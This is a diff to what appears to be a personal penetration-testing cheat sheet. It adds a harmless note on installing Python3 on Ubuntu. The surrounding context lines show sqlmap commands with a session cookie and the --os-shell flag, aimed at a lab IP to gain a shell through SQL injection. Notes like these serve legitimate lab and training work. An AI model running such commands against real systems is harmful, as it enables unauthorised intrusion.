@@ -273,6 +273,10 @@ Using the session cookies and sqlmap: `sqlmap -u 'http://10.129.95.174/dashboard
 
 If the target is vulnerable for the get request (see above) we can get a shell out of it: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`
 
+## Install Python3 on Ubuntu
+
+* `sudo apt install python3 python3-pip build-essential python3-dev`
+
 ## ssh
 
 * removing credentials from known_hosts for ssh `ssh-keygen -f "/home/user/.ssh/known_hosts" -R "[<IP>]:<PORT>"`
